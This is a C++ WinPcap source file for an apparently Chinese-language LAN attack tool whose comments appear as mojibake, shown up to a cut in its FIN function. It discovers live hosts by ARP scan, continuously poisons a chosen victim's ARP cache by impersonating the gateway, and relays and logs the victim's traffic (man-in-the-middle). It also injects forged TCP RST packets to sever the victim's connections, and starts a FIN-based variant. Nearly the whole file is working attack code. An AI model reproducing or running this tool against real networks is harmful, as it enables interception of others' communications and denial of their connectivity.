#include "pcap.h"
#include <thread>
#include <atomic>
#include <mutex>
#include <condition_variable>

#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <chrono>
#include <vector>
#include <windows.h>

#include <Packet32.h>
#include <ntddndis.h>
#include "Iphlpapi.h"
#pragma comment(lib, "IpHlpApi.lib")

using std::cout;
using std::endl;

// 0x0806��arpЭ��
#define		ETH_P_ALL	0x0003
#define		ETH_P_IP	0x0800
#define		_WINSOCK_DEPRECATED_NO_WARNINGS		// �����ͻ

struct C_EthHead
{
	u_char	DstMac[6];
	u_char	SrcMac[6];
	u_short	Proto;
};
struct C_IP4Head
{
	u_char	VerAndHeadlen;		// 1�ֽ�	4λ�汾��(4)+4λ�ײ�����(һ��20)
	u_char	tos;				// 1�ֽ�	tos��������(������)
	u_short PacketLength;		// 2�ֽ�	�������ĳ���
	u_short identification;		// 2�ֽ�	16λ��ʶ��(��Ƭ������ʹ��)
	u_short	TagAndOffset;		// 2�ֽ�	3λ��־+13λƬƫ��(��Ƭ������ʹ��)
	u_char	TTL;				// 1�ֽ�	��������
	u_char	proto;				// 1�ֽ�	Э������  1 2 6 17,�ֱ���ICMP IGMP TCP UDP
	u_short CheckSum;			// 2�ֽ�	У���
	IN_ADDR SrcIP;				// 4�ֽ�	ԴIP
	IN_ADDR DstIP;				// 4�ֽ�	Ŀ��IP
};
struct C_TCPHead
{
	u_short	SrcPort;			// 2�ֽ�	Դ�˿�
	u_short	DstPort;			// 2�ֽ�	Ŀ�Ķ˿�
	u_int	SeqNumber;			// 4�ֽ�	���͵����
	u_int	AckNumber;			// 4�ֽ�	�����յ��ĶԷ�����һ�����
	u_char	HeadLength;			// 1�ֽ�	ǰ4λ��ʾ�ײ����ȣ�����λ������
	u_char	tag;				// 1�ֽ�	ǰ��λ������������λ�ֱ����� URG ACK PSH RST SYN FIN
	u_short	WindowSize;			// 2�ֽ�	
	u_short CheckSum;			// 2�ֽ�	����ͣ�����TCP�ײ������ݣ���ϵͳǿ����д
	u_short UrgPtr;				// 2�ֽ�	����ָ��
};
struct C_UDPHead
{
	u_short	SrcPort;			// 2�ֽ�	Դ�˿�
	u_short	DstPort;			// 2�ֽ�	Ŀ�Ķ˿�
	u_short	PacketLen;			// 2�ֽ�	�����ײ����������ڵĳ���
	u_short	CheckSum;			// 2�ֽ�	У���
};
struct C_ARPPacket
{
	u_short	HardwareType;		// 2�ֽ�	Ӳ�����ͣ�Ϊ1��ʾ��̫����ַ
	u_short ProtoType;			// 2�ֽ�	Э�����ͣ�Ϊ0x0800��ʾIP
	u_char	HardwareLen;		// 1�ֽ�	Ӳ����ַ���ȣ�һ��Ϊ6
	u_char	ProtoLen;			// 1�ֽ�	Э���ַ���ȣ�һ��Ϊ14
	u_short	OperType;			// 2�ֽ�	�������ͣ�1ΪARP����2ΪARPӦ��3��4ΪRARP�������Ӧ��
	u_char	SrcMacAndIP[10];	// 10�ֽ�	Դmac��ip			// �����mac��IP����һ���ԭ����,mac��6�ֽڣ����������IN_ADDR��IP�ṹ���ᵼ��mac��6�ֽڶ��뵽8�ֽ�
	u_char	DstMacAndIP[10];	// 10�ֽ�	Ŀ��mac��ip
};

int					choose;						// ��֧��ѡ������
char				errbuf[PCAP_ERRBUF_SIZE];	// ������Ϣ�洢
int					DevPacketCount[256]{ -1 };	// ��ʱ���ڶ��յ��İ�����
std::atomic<int>	EXIT = 0;					// ���������߳��˳��ı��
std::atomic<int>	STOP = 0;					// �������Ʋ�����ֹͣ��arp��ƭ�̺߳�arp��ƭ��ץ�����̣߳������������ֹͣ
std::atomic<int>	PacketCount = 0;			// ͳ�ƽ��յ��İ�������ÿ��ӡһ��������+1
std::mutex					mtx;				// �����߳�ͬ��
std::condition_variable		cond;				// �����߳�ͬ��

pcap_if_t*			alldevs, * d;				// ǰ�������洢���������豸����Ϣ��������������
int					DevCount = 0;				// ͳ�������豸�ĸ���
pcap_t*				PcapHandle[256];			// pcap��ĳ��������ȡ�õľ��(�����������)
int					DevNumber;					// �洢��ѡ���������			
unsigned char		MAC[6];						// �洢�����Ŷ�Ӧ��MAC
IN_ADDR				LocalDevIp;					// �洢�����Ŷ�Ӧ��IP
IN_ADDR				NetIp;						// ��ǰ���ε� �����ַ
IN_ADDR				DefaultGateWayIp;			// ��ǰ���ε� Ĭ������   �������ַ��+1
u_char				DefaultGateWayMac[6];		// Ĭ�����ص� mac
IN_ADDR				BroadIp;					// ��ǰ���ε� �㲥��ַ
IN_ADDR				MaskIp;						// ��ǰ���ε� ��������
IN_ADDR				ByAttackerIP;				// ��������IP
u_char				ByAttackerMAC[6];			// ��������MAC

std::vector<std::pair<ULONG*, u_char*>>	LiveDev;	// ��������ǰ����豸��IP��MAC

pcap_pkthdr*	pkd;			// ���ڽ������ݰ��Ľṹ
const u_char*	RecvBuf{};		// ���ڽ������ݰ��Ľṹ
int				res;			// �հ��ķ���ֵ

time_t			local_tv_sec;	// ���ڴ�ӡʱ���
struct			tm* ltime;		// ���ڴ�ӡʱ���
char			timestr[16];	// ���ڴ�ӡʱ���

u_char			IPheadlen;		// IP��ͷ����		һ��Ҫ�޷��Ų��ܼ����
u_int			TCPheadlen;		// TCP��ͷ����
u_int			UDPheadlen;		// ��ͷ����

C_EthHead*		EthHead;		// ��̫��ͷָ��
C_IP4Head*		Ip4Head;		// IP4ͷָ��
C_TCPHead*		TcpHead;		// TCPͷָ��
C_UDPHead*		UdpHead;		// UDPͷָ��
int				PrintfCount = 0;// ��ӡ��ʱ�ļ���
int				RecvCount = 0;	// �յ���ʱ�ļ���


void InputThread();				// ���������߳�

int ChooseDev();										// ��ȡ��ǰ�豸��������������Ϊÿ����������һ�� ���Խ����̣߳���ѡ��ʹ���ĸ�����
void ChooseDevOutPutThread(pcap_if_t* dev, int id);		// ���Խ����߳�

void GetNetInfo();				// ��ȡ��ѡ������mac���Լ���ǰ������������롢IP�����ء���

void LocalNetDiscover();		// �������豸���֣��գ��̣߳��յ��ظ��ͱ����ӡ
void LocalNetDevDetectThread();	// �������豸���֣������̣߳���������ÿ��IP����һ��ARP����

void MainMenu();				// ���˵�������ѭ��ѡ��ִ��ʲô����

void ShadowListen();			// �Ա������ߵİ�ת��+��ӡ
void SustainCheatThread();		// �����Ա������߷���arp��ƭ

void RstDisNet();				// rst������ͬ������SustainCheatThread������arp��ƭץ��
void FinDisNet();				// fin����

unsigned int IPStrToInt(const char* ip);					// IP�ַ���ת��Ϊ����
short IpCheckSum(short* ip_head_buffer, int ip_hdr_len);	// IP��У��ͺ���
SHORT Tcpchecksum(USHORT* buffer, int size);				// TCP��У��Ͱ�����ͷ������

int main()
{	
	std::thread t(InputThread);		// ����һ���߳�������������
	t.detach();
	ChooseDev();					// ����������ѡ��һ��������Ϊ��ƭ��
	GetNetInfo();					// ��ȡ����mac��IP�洢��ȫ��LocalDevIp��MAC
	LocalNetDiscover();				// ��������ÿ��IP����һ��ARP����,�յ��ظ����������ӡ
	MainMenu();
	printf("���������ַ���������\n");
	for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)	// ����ռ�
	{
		delete it->first;
		delete [] it->second;
	}
	pcap_freealldevs(alldevs);									// �ͷŽṹ
	getchar();
	return 0;
}

void InputThread()
{
	printf("�����߳���������\n\n");
	char cmd[1024];
	while (!EXIT)
	{
		scanf("%s", cmd);
		if (strcmp(cmd, "choose") == 0)
		{
			scanf("%d", &choose);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "stop") == 0)
		{
			STOP = 1;
		}
		else if (strcmp(cmd, "gateway") == 0)
		{
			scanf("%s", cmd);
			DefaultGateWayIp.S_un.S_addr = IPStrToInt(cmd);
			DefaultGateWayIp.S_un.S_addr = htonl(DefaultGateWayIp.S_un.S_addr);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if(strcmp(cmd,"byattacker") == 0)
		{
			scanf("%s", cmd);
			ByAttackerIP.S_un.S_addr = IPStrToInt(cmd);
			ByAttackerIP.S_un.S_addr = htonl(ByAttackerIP.S_un.S_addr);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "dev") == 0)
		{
			scanf("%d", &DevNumber);
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "jump") == 0)
		{
			std::lock_guard<std::mutex> lk(mtx);
			cond.notify_one();
		}
		else if (strcmp(cmd, "exit") == 0)
			EXIT = 1;
		else
			printf("δ�������롣\n\n");
	}
	printf("�����߳��ѽ�����\n\n");
}

int ChooseDev()
{
	if (pcap_findalldevs(&alldevs, errbuf) == -1)			// ȡ�����е������豸
	{
		fprintf(stderr, "Error inpcap_findalldevs: %s\n", errbuf);
		return 0;
	}

	for (d = alldevs; d; d = d->next)						// ��ӡ���е������豸
	{
		printf("%d. %s", DevCount++, d->name);
		if (d->description)  printf(" (%s)\n", d->description);
		else  printf(" (Nodescription available)\n");
	}
	printf("\n");

	d = alldevs;											// Ϊÿ�������豸����һ���հ������̣߳��Դ���ѡ������
	for (int i = 0; i < DevCount && d; ++i, d = d->next)
	{
		PcapHandle[i] = pcap_open_live(d->name, 65536, PCAP_OPENFLAG_PROMISCUOUS, 1000, nullptr);		
		if (d)
		{
			if (PcapHandle[i] == nullptr)
			{
				printf("�豸%d.<%s>��ʧ�ܣ����豸��������\n", d->name, i);
				continue;
			}
		}
		else
		{
			printf("��ͼ�򿪵��豸ָ��Ϊ�գ����豸��������\n");
			continue;
		}

		std::thread t(ChooseDevOutPutThread, d, i);
		t.detach();

		printf("�豸 <%s> �򿪳ɹ�����������߳��ѷ��롣\n", d->name);
	}

	printf("\n3���������ԡ�\n\n");
	std::this_thread::sleep_for(std::chrono::milliseconds(3000));
	EXIT = 1;
	std::this_thread::sleep_for(std::chrono::milliseconds(2000));
	EXIT = 0;
	int MaxPacket = -1;
	d = alldevs;
	printf("\n���������հ�������\n");
	for (int i = 0; i < 256 && d; ++i, d = d->next)
	{
		if (DevPacketCount[i] > 0)
		{
			printf("\tDevPacketCount[%d]:%d\t(%s)\n", i, DevPacketCount[i], d->description);
			if (MaxPacket < DevPacketCount[i])
			{
				MaxPacket = DevPacketCount[i];
				DevNumber = i;
			}
		}
	}
	printf("\n����ѡ����������������ѡ���հ�������������ǰΪ��%d����������\n�����ʽ:( dev <�ո�> number) or (jump ):", DevNumber);
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
}
void ChooseDevOutPutThread(pcap_if_t* dev, int id)
{
	std::this_thread::sleep_for(std::chrono::milliseconds(1200));

	while (!EXIT)
	{
		++DevPacketCount[id];
		res = pcap_next_ex(PcapHandle[id], &pkd, &RecvBuf);
		EthHead = (C_EthHead*)RecvBuf;
		Ip4Head = (C_IP4Head*)(RecvBuf + 14);
		if (res == 0)	// ��ʱ
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex����\n");
			EXIT = 1;
		}
	}

	printf("��������߳��ѽ������豸��<%s>��\n", dev->description);
}

void GetNetInfo()
{
	d = alldevs;
	pcap_addr_t* a;
	for (int i = 0; i < 256 && d; ++i, d = d->next)		// 
	{
		if(i == DevNumber)
		{
			for (a = d->addresses; a; a = a->next)
			{
				switch (((sockaddr_in*)a->addr)->sin_family)
				{
					case AF_INET:
						if (a->addr)
						{
							DWORD dwLen;
							dwLen = 6;
							strncpy((char*)&LocalDevIp, (const char *)&((sockaddr_in*)a->addr)->sin_addr, sizeof(LocalDevIp));
							strncpy((char*)&MaskIp, (const char*)&((sockaddr_in*)a->netmask)->sin_addr, sizeof(MaskIp));
							BroadIp.S_un.S_addr = LocalDevIp.S_un.S_addr | (~MaskIp.S_un.S_addr);
							NetIp.S_un.S_addr = LocalDevIp.S_un.S_addr & MaskIp.S_un.S_addr;
							DefaultGateWayIp.S_un.S_addr = NetIp.S_un.S_addr + 0x01000000;
							if (SendARP(*(IPAddr*)&LocalDevIp, 0, (PULONG)&MAC, &dwLen) != NO_ERROR)
							{
								printf("Error: GetMac::sendarp\n");
								exit(0);
							}
							printf("\n ��ַ��ȡ�ã�\n");
							printf("\t����IP��\t%s\n", inet_ntoa(LocalDevIp));
							printf("\t�����ַ��\t%s\n", inet_ntoa(NetIp)); 
							printf("\tĬ�����أ�\t%s\n", inet_ntoa(DefaultGateWayIp));
							printf("\t�㲥��ַ��\t%s\n", inet_ntoa(BroadIp));
							printf("\t�������룺\t%s\n", inet_ntoa(MaskIp));
							printf("\tMAC��ַ��\t%02X-%02X-%02X-00-00-00\n", MAC[0], MAC[1], MAC[2]);
						}
						break;
					default:
						//cout << "����Э����δ֪.";
						break;
				}
			}
			break;
		}
	}
}

void LocalNetDiscover()
{
	printf("\n��ʼ����������...\n\n");

	const u_char*	RecvBuf{};			// ���ڽ������ݰ��Ľṹ
	int				res;

	C_ARPPacket*	ArpP;				

	std::vector<ULONG>	DeWeight;		// ȥ���ظ���̽��ظ� 

	u_char* PucharTemp;					// �洢����IP��MAC�õ���ָ��	
	ULONG*	PulongTemp;					// �洢����IP��MAC�õ���ָ��	

	
	std::thread t(LocalNetDevDetectThread);		// ������һ���̷߳���̽���
	t.detach();

	// ��ǰ�߳����հ���ӡ
	// ���ȴ�7��������arp�ظ���
	auto timeout = std::chrono::steady_clock::now() + std::chrono::seconds(7);
	while (std::chrono::steady_clock::now() < timeout && !EXIT)
	{
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);
		EthHead = (C_EthHead*)RecvBuf;
		ArpP = (C_ARPPacket*)(RecvBuf + 14);
		if (res == 0)	// ��ʱ
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex����2,�հ�����\n\n");
			break;
		}
		if (ntohs(EthHead->Proto) != 0x0806)		// ֻ��ȡΪ0x0806��ARP��
			continue;
		if (ntohs(ArpP->OperType) != 2)				// ���ǻظ����ͺ���
			continue;
		if (strncmp((char *)ArpP->SrcMacAndIP + 6, (char*)&LocalDevIp, 4) == 0)		// ����������ARP�ظ���������
			continue;
		if (std::find(DeWeight.begin(), DeWeight.end(), (*(ULONG*)(ArpP->SrcMacAndIP + 6))) != DeWeight.end())	// ȥ���ظ���̽��
			continue;
		DeWeight.push_back(*(ULONG*)(ArpP->SrcMacAndIP + 6));
		PucharTemp = new u_char[6];					// ������ָ����main��������ͷ�
		PulongTemp = new ULONG;						// ������ָ����main��������ͷ�
		strncpy((char *)PucharTemp, (char *)ArpP->SrcMacAndIP, 6);
		strncpy((char *)PulongTemp, (char *)(ArpP->SrcMacAndIP + 6), 4);
		LiveDev.push_back(std::make_pair<ULONG*, u_char*>((ULONG *)PulongTemp, (u_char *)PucharTemp));
		if (strncmp((char*)&(DefaultGateWayIp.S_un.S_addr), (char*)(ArpP->SrcMacAndIP + 6), 4) == 0)		// ��������ص�IP������Mac
		{
			strncpy((char*)DefaultGateWayMac, (char*)ArpP->SrcMacAndIP, 6);
		}
	}

	printf("������������ϡ�\n\n");
	std::this_thread::sleep_for(std::chrono::milliseconds(1000));
}
void LocalNetDevDetectThread()
{
	std::this_thread::sleep_for(std::chrono::milliseconds(2000));

	// �ȹ���һ��ARP��
	u_char* ArpPacket = new u_char[sizeof(C_EthHead) + sizeof(C_ARPPacket)];
	EthHead = (C_EthHead*)ArpPacket;
	C_ARPPacket* AH = (C_ARPPacket*)(ArpPacket + sizeof(C_EthHead));

	// ��д��̫��֡ͷ
	memset(EthHead->DstMac, UCHAR_MAX, 6);						// ��̫��Ŀ�ĵ�ַȫ1���㲥
	strncpy((char*)EthHead->SrcMac, (const char*)&MAC, 6);		// Դ��ַ��д������õ�MAC
	EthHead->Proto = htons(0x0806);								// 0x0806��arpЭ��

	// ��дARP��
	AH->HardwareType = htons(1);
	AH->ProtoType = htons(0x0800);
	AH->HardwareLen = 6;
	AH->ProtoLen = 4;
	AH->OperType = htons(1);
	strncpy((char*)AH->SrcMacAndIP, (const char*)MAC, 6);				// ��дԴMAC
	strncpy(((char*)AH->SrcMacAndIP) + 6, (const char*)&LocalDevIp, 4);	// ��дԴIP
	memset((char*)AH->DstMacAndIP, 0, 6);
	// Ŀ��IP����ѭ������
	// strncpy(((char*)&AH->DstMacAndIP) + 6, (const char*)&ip.S_un.S_addr, 4);

	auto StartTime = std::chrono::steady_clock::now();
	for (auto it = NetIp.S_un.S_addr; it < BroadIp.S_un.S_addr; it += 0x01000000)
	{
		strncpy(((char*)AH->DstMacAndIP) + 6, (const char*)&it, 4);
		if (pcap_sendpacket(PcapHandle[DevNumber], ArpPacket, sizeof(C_EthHead) + sizeof(C_ARPPacket) /* size */) != 0)
		{
			printf("Ŀ��IP��<%s>��arp̽�������ʧ��XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
			continue;
		}
		//printf("Ŀ��IP��<%s>��arp̽������ͳɹ�\n", inet_ntoa(*(IN_ADDR*)&it));
	}
	printf("����ARP̽�����<%d>�����ڷ�����ϡ�\n\n", (std::chrono::steady_clock::now() - StartTime).count() / 1000000);

	// �ͷſռ�
	delete[] ArpPacket;
}

void MainMenu()
{
	while (!EXIT)
	{
		system("cls");
		printf("\n");
		for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)
		{
			printf("������IP��<%s>\tMAC��<%02x-%02x-%02x-00-00-00>\n\n", inet_ntoa(*(IN_ADDR*)(it->first)), it->second[0], it->second[1], it->second[2]);
		}
		printf("\n\n");
		printf("\t\t\t\t\t1.����̽�������\n\n");
		printf("\t\t\t\t\t2.ARP��ƭץ��\n\n");
		printf("\t\t\t\t\t3.RST����\n\n");
		printf("\t\t\t\t\t4.FIN����\n\n");;
		printf("\t\t\t\t\t8.�˳�\n\n");
		printf("�����ʽ:( choose <�ո�> number ):");
		std::unique_lock<std::mutex> lk(mtx);
		cond.wait(lk);
		lk.unlock();
		printf("\n");
		STOP = 0;
		switch (choose)
		{
		case 1:
			LiveDev.clear();
			LocalNetDiscover(); break;

		case 2:
			ShadowListen(); break;

		case 3:
			RstDisNet(); break;

		case 4:
			FinDisNet(); break;

		case 8:
			printf("aaa �˳�\n");
			EXIT = 1; break;

		default:
			printf("��ѡ�񲻴���!\n");
			std::this_thread::sleep_for(std::chrono::seconds(1)); break;
		}
		std::this_thread::sleep_for(std::chrono::seconds(1));
	}
}

void ShadowListen()
{
	printf("�����������IP.\n�����ʽ:( byattacker <�ո�> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n��������IP����������ʹ��Ĭ�����ء�����ǰΪ��<%s>��\n�����ʽ:( gateway <�ո�> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();
	
	std::thread t(SustainCheatThread);		// һ���߳������Է���arp��ƭ��
	t.detach();

	printf("\n��ʼץ��...\n\n");			// ��ǰ�߳��հ�+ת��+��ӡ
	while (!STOP)
	{
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// ץȡĿ�����ݰ�
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// ��̫����ͷָ����λ		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// ԴMAC�Ǳ������ߵ�MAC��ת��
		if (res == 0)								// ��ʱ
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// ֻ����IP4��
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex����\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4��ͷ��λ

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// ����IP��ͷ����
		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// �����ͷ���Ȳ��֡�
		{
			printf("��ͷ���Ȳ���ȷ��������ֵΪ��%d\n\n", IPheadlen);
			continue;
		}

		local_tv_sec = pkd->ts.tv_sec;				// ��������֡��ʱ��
		ltime = localtime(&local_tv_sec);
		strftime(timestr, sizeof(timestr), "%H:%M:%S", ltime);
		printf("No %6d: TIME:<%s> \t", ++PrintfCount, timestr);	
		
		switch (Ip4Head->proto)						// ����Э���ֶ�		1 2 6 17,�ֱ���ICMP IGMP TCP UDP
		{
			case 6:
				TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);
				printf("TCP  Դ:<%s:%d> \t", inet_ntoa(Ip4Head->SrcIP), TcpHead->SrcPort);		// ��Ϊinet_ntoa����ͬʱʹ�ûᵼ������
				printf("Ŀ��: <%s:%d>\n", inet_ntoa(Ip4Head->DstIP), TcpHead->DstPort);			// ���Էֿ���ӡ
				printf("\t\t\t\t���͵���ţ�<%u>\tȷ�ϵ����<%u>\n\n", ntohl( ntohl(TcpHead->SeqNumber)), ntohl(ntohl(TcpHead->AckNumber)));
				break;

			case 17:
				UdpHead = (C_UDPHead*)(RecvBuf + 14 + IPheadlen);
				printf("UDP  Դ:<%s:%d> \t", inet_ntoa(Ip4Head->SrcIP), UdpHead->SrcPort);
				printf("Ŀ��: <%s:%d>\n\n", inet_ntoa(Ip4Head->DstIP), UdpHead->DstPort);
				break;

			case 1:
				//printf("<%s>:һ��ICMP��������\n\n", LocalAddrBuf);
				break;

			case 2:
				//printf("<%s>:һ��IGMP��������\n\n", LocalAddrBuf);
				break;

			default:
				//printf("<%s>:�յ�һ��δ��������Э�����ͣ�%d\n\n", LocalAddrBuf, IPhead->proto);
				break;
		}
	}
	printf("ץ���ѽ�����\n\n");
}
void SustainCheatThread()
{
	u_char* ArpPacket = new u_char[sizeof(C_EthHead) + sizeof(C_ARPPacket)];	// �ȹ���һ��ARP��
	EthHead = (C_EthHead*)ArpPacket;
	C_ARPPacket* AH = (C_ARPPacket*)(ArpPacket + sizeof(C_EthHead));

	for (auto it = LiveDev.begin(); it < LiveDev.end(); ++it)			// ��д��̫��֡ͷ
	{
		if (strncmp((char*)&ByAttackerIP.S_un.S_addr, (char*)(it->first), 4) == 0)
		{
			strncpy((char*)EthHead->DstMac, (char*)(it->second), 6);			// �ҵ�IP��Ӧ��mac����д
			strncpy((char*)AH->DstMacAndIP, (char*)(it->second), 6);			// arp����Ŀ��macҲ˳������������
			strncpy((char*)ByAttackerMAC, (char*)(it->second), 6);				// ˳��ȡһ�±�������mac
			break;
		}
	}
	strncpy((char*)EthHead->SrcMac, (const char*)&MAC, 6);		// ��̫��Դ��ַ��д������õı���MAC
	EthHead->Proto = htons(0x0806);								// 0x0806��arpЭ��

	AH->HardwareType = htons(1);		// ��дARP��
	AH->ProtoType = htons(0x0800);
	AH->HardwareLen = 6;
	AH->ProtoLen = 4;
	AH->OperType = htons(2);
	strncpy((char*)AH->SrcMacAndIP, (const char*)MAC, 6);						// ARP��дԴMAC
	strncpy(((char*)AH->SrcMacAndIP) + 6, (const char*)&DefaultGateWayIp, 4);	// ARP��дԴIP
	strncpy(((char*)AH->DstMacAndIP) + 6, (const char*)&ByAttackerIP.S_un.S_addr, 4);

	printf("arp��ƭ�߳���������\n\n");
	while (!STOP)
	{
		if (pcap_sendpacket(PcapHandle[DevNumber], ArpPacket, sizeof(C_EthHead) + sizeof(C_ARPPacket)) != 0)
		{
			printf("arp��ƭ������ʧ��XXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\n");
			continue;
		}
		std::this_thread::sleep_for(std::chrono::milliseconds(500));
	}

	delete[] ArpPacket;		// �ͷſռ�

	printf("ARP��ƭ�߳��ѽ�����\n\n");
}

void RstDisNet()
{
	printf("����RstDisNet����IP.\n�����ʽ:( byattacker <�ո�> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n��������IP����������ʹ��Ĭ�����ء�����ǰΪ��<%s>��\n�����ʽ:( gateway <�ո�> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();

	std::thread t(SustainCheatThread);		// һ���߳������Է���arp��ƭ��
	t.detach();

	u_char* RstPacket = new u_char[sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4];

	while (!STOP)			// �����������հ�,Ȼ����RST��
	{
		memset(RstPacket, 0 , sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4);
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// ץȡĿ�����ݰ�
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// ��̫����ͷָ����λ		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// ԴMAC�Ǳ������ߵ�MAC��ת��
		if (res == 0)								// ��ʱ
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// ֻ����IP4��
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex����\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4��ͷ��λ

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// ����IP��ͷ����
		IPheadlen = IPheadlen >> 4;
		IPheadlen *= 4;

		if (IPheadlen < 20 || IPheadlen > 60)		// �����ͷ���Ȳ��֡�
		{
			printf("��ͷ���Ȳ���ȷ��������ֵΪ��%d\n\n", IPheadlen);
			continue;
		}

		if(Ip4Head->proto == 6)						// ֻ����Ϊ6��TCP��
		{
			TcpHead = (C_TCPHead*)(RecvBuf + 14 + IPheadlen);
			
			C_EthHead* TempEth = (C_EthHead*)RstPacket;
			C_IP4Head* TempIp4 = (C_IP4Head*)(RstPacket + 14);
			C_TCPHead* TempTcp = (C_TCPHead*)(RstPacket + 14 + sizeof(C_IP4Head));

			// ��ٵ���̫��֡ͷ��ԴMAC��Ŀ��MAC�����������ֶθ���
			strncpy((char*)TempEth->SrcMac, (char*)EthHead->DstMac, 6);
			strncpy((char*)TempEth->DstMac, (char*)EthHead->SrcMac, 6);
			strncpy((char*)&(TempEth->Proto), (char*)&(EthHead->Proto), 2);

			// ��ٵ�IP4ͷ�� �汾���ײ����ȡ�tos�Թ���������������ʶ���Թ�����Ƭ�Թ���TTL=255��proto���ơ�У����Թ���ԴIPĿ��IP����
			strncpy((char*)&(TempIp4->VerAndHeadlen), (char*)&(Ip4Head->VerAndHeadlen), 1);
			TempIp4->VerAndHeadlen >>= 4;
			TempIp4->VerAndHeadlen <<= 4;
			TempIp4->VerAndHeadlen += 5;
			TempIp4->PacketLength = sizeof(C_IP4Head) + sizeof(C_TCPHead);
			TempIp4->PacketLength = htonl(TempIp4->PacketLength);
			TempIp4->TTL = 255;
			strncpy((char*)&(TempIp4->proto), (char*)&(Ip4Head->proto), 1);
			strncpy((char*)&(TempIp4->SrcIP.S_un.S_addr), (char*)&(Ip4Head->DstIP.S_un.S_addr), 4);
			strncpy((char*)&(TempIp4->DstIP.S_un.S_addr), (char*)&(Ip4Head->SrcIP.S_un.S_addr), 4);
			TempIp4->CheckSum = IpCheckSum((short*)TempIp4, 20);

			// ��ٵ�TCPͷ�� Դ�˿�Ŀ�Ķ˿ڽ��������͵�����Ǳ������ߵ�ack-1+4�������յ�������Ǳ������߷������+1�������ֶΡ�rst | ack��־��λ��windowsize 0���������
			strncpy((char*)&(TempTcp->SrcPort), (char*)&(TcpHead->DstPort), 2);
			strncpy((char*)&(TempTcp->DstPort), (char*)&(TcpHead->SrcPort), 2);
			TempTcp->SeqNumber = TcpHead->AckNumber;
			TempTcp->SeqNumber = htonl(TempTcp->SeqNumber);
			TempTcp->AckNumber = TcpHead->SeqNumber;
			TempTcp->AckNumber = htonl(TempTcp->AckNumber);
			TempTcp->HeadLength = 5;
			TempTcp->HeadLength <<= 4;
			TempTcp->tag = 0;
			TempTcp->tag |= 1 << 2;
			//TempTcp->tag |= 1 << 4;
			TempTcp->WindowSize = htons(0);
			TempTcp->CheckSum = Tcpchecksum((USHORT*)TempTcp, 20);
			pcap_sendpacket(PcapHandle[DevNumber], (u_char*)RstPacket, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead));
			//printf("�ѷ��ͣ�\n");
		}
	}

	delete[] RstPacket;
}
void FinDisNet()
{
	printf("����RstDisNet����IP.\n�����ʽ:( byattacker <�ո�> IP ):");
	std::unique_lock<std::mutex> lk(mtx);
	cond.wait(lk);
	printf("\n��������IP����������ʹ��Ĭ�����ء�����ǰΪ��<%s>��\n�����ʽ:( gateway <�ո�> ip) or (jump ):", inet_ntoa(DefaultGateWayIp));
	cond.wait(lk);
	lk.unlock();

	std::thread t(SustainCheatThread);		// һ���߳������Է���arp��ƭ��
	t.detach();

	u_char* RstPacket = new u_char[sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4];

	while (!STOP)			// �����������հ�,Ȼ����FIN��
	{
		memset(RstPacket, 0, sizeof(C_EthHead) + sizeof(C_IP4Head) + sizeof(C_TCPHead) + 4);
		res = pcap_next_ex(PcapHandle[DevNumber], &pkd, &RecvBuf);			// ץȡĿ�����ݰ�
		++RecvCount;
		EthHead = (C_EthHead*)RecvBuf;										// ��̫����ͷָ����λ		
		if (strncmp((char*)EthHead->SrcMac, (char*)ByAttackerMAC, 6) != 0)
			continue;
		pcap_sendpacket(PcapHandle[DevNumber], RecvBuf, pkd->caplen);		// ԴMAC�Ǳ������ߵ�MAC��ת��
		if (res == 0)								// ��ʱ
			continue;
		if (ntohs(EthHead->Proto) != ETH_P_IP)		// ֻ����IP4��
			continue;
		if (res < 0)
		{
			printf("pcap_next_ex����\n\n");
			continue;
		}

		Ip4Head = (C_IP4Head*)(RecvBuf + 14);		// IP4��ͷ��λ

		IPheadlen = Ip4Head->VerAndHeadlen << 4;	// ����IP��ͷ����
